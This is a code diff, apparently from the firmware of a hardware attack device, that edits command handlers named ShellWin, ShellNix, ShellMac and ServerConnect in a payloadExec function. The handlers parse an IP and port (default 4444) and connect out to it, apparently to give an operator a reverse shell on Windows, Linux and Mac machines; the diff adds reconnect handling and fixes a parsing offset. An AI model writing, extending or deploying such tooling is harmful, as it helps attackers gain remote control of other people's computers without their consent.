@@ -951,9 +951,15 @@ void payloadExec() {
   }
 
   else if (cmd.startsWith("ShellWin ")) {
+    if (clientServer.connected()) {
+        clientServer.stop();
+        delay(100);
+    }
+
     String connectionString = cmd.substring(9);
     String ip;
     int port;
+
     // Parse IP:PORT or use default 4444
     int colonPos = connectionString.indexOf(':');
     if (colonPos == -1) {
@@ -963,6 +969,7 @@ void payloadExec() {
         ip = connectionString.substring(0, colonPos);
         port = connectionString.substring(colonPos + 1).toInt();
     }
+
     // Connect with 5 second timeout
     unsigned long startTime = millis();
     bool connected = false;
@@ -988,9 +995,15 @@ void payloadExec() {
   }
 
   else if (cmd.startsWith("ShellNix ")) {
+    if (clientServer.connected()) {
+        clientServer.stop();
+        delay(100);
+    }
+
     String connectionString = cmd.substring(9);
     String ip;
     int port;
+
     // Parse IP:PORT or use default 4444
     int colonPos = connectionString.indexOf(':');
     if (colonPos == -1) {
@@ -1000,6 +1013,7 @@ void payloadExec() {
         ip = connectionString.substring(0, colonPos);
         port = connectionString.substring(colonPos + 1).toInt();
     }
+
     // Connect with 5 second timeout
     unsigned long startTime = millis();
     bool connected = false;
@@ -1039,7 +1053,12 @@ void payloadExec() {
   }
 
   else if (cmd.startsWith("ServerConnect ")) {
-    String connectionString = cmd.substring(9);
+    if (clientServer.connected()) {
+        clientServer.stop();
+        delay(100);
+    }
+
+    String connectionString = cmd.substring(14);
     String ip;
     int port;
 
@@ -1056,7 +1075,6 @@ void payloadExec() {
     // Connect with 5 second timeout
     unsigned long startTime = millis();
     bool connected = false;
-
     while (!(connected = clientServer.connect(ip.c_str(), port))) {
         if (millis() - startTime >= 5000) {
             return;
@@ -1066,6 +1084,11 @@ void payloadExec() {
   }
   
   else if (cmd.startsWith("ShellMac ")) {
+    if (clientServer.connected()) {
+        clientServer.stop();
+        delay(100);
+    }
+
     String connectionString = cmd.substring(9);
     String ip;
     int port;
@@ -1083,7 +1106,6 @@ void payloadExec() {
     // Connect with 5 second timeout
     unsigned long startTime = millis();
     bool connected = false;
-
     while (!(connected = clientServer.connect(ip.c_str(), port))) {
         if (millis() - startTime >= 5000) {
             return;
